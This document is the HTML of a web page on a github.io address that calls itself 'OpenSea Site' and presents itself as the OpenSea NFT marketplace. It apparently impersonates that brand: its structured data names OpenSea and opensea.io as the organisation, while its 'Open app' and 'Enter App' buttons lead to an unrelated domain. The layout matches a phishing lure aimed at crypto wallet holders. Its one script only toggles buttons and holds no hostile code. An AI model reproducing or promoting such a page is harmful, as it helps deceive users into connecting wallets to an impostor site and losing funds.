<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>OpenSea Site</title>
  <meta name="description" content="OpenSea Site is the marketplace to browse, buy and sell NFTs from your own wallet.">
  <link rel="canonical" href="https://opensea-site.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F6F8FB">
  <meta property="og:type" content="website">
  <meta property="og:title" content="OpenSea Site">
  <meta property="og:description" content="OpenSea Site is the marketplace to browse, buy and sell NFTs from your own wallet.">
  <meta property="og:url" content="https://opensea-site.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="OpenSea Site">
  <meta name="twitter:description" content="OpenSea Site is the marketplace to browse, buy and sell NFTs from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <header class="topbar">
    <div class="brand" aria-label="OpenSea Site">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>OpenSea Site</span>
    </div>
    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/nft-top-contracts" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/nft/" target="_blank" rel="nofollow noopener noreferrer">NFT guide</a>
      <a href="https://www.coingecko.com/en/nft" target="_blank" rel="nofollow noopener noreferrer">CoinGecko</a>
    </nav>
    <span class="spacer"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-label="OpenSea Site">
      <h1>OpenSea Site</h1>
      <p class="sub"><strong>OpenSea Site</strong> is the marketplace to browse, buy and sell NFTs from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="NFT marketplace preview">
      <div class="nft-tile" aria-hidden="true">
        <div class="tile-mark"></div>
      </div>

      <div class="market-row">
        <span class="market-copy">Browse, buy and sell NFTs</span>
        <span class="eth-chip">
          <img src="eth.png" width="22" height="22" alt="ETH">
          <span>ETH</span>
        </span>
      </div>

      <div class="mode" role="group" aria-label="Marketplace action">
        <button class="mode-btn active" type="button" data-mode="Buy" aria-pressed="true">Buy</button>
        <button class="mode-btn" type="button" data-mode="Sell" aria-pressed="false">Sell</button>
      </div>

      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App <span aria-hidden="true">&#8250;</span></a>
    </section>
  </main>

  <footer class="foot">OpenSea Site &mdash; 2026</footer>

  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://avalanche-ecosystem.github.io/#website",
        "url": "https://avalanche-ecosystem.github.io/",
        "name": "OpenSea Site",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://avalanche-ecosystem.github.io/#organization",
        "name": "OpenSea",
        "url": "https://opensea.io/",
        "sameAs": ["https://opensea.io/"]
      },
      {
        "@type": "WebApplication",
        "@id": "https://avalanche-ecosystem.github.io/#app",
        "name": "OpenSea Site",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://avalanche-ecosystem.github.io/"
      }
    ]
  }
  </script>

  <script>
  (function(){
    "use strict";
    var buttons = document.querySelectorAll("[data-mode]");
    buttons.forEach(function(button){
      button.addEventListener("click", function(){
        buttons.forEach(function(item){
          var active = item === button;
          item.classList.toggle("active", active);
          item.setAttribute("aria-pressed", active ? "true" : "false");
        });
      });
    });
  })();
  </script>
</body>
</html>
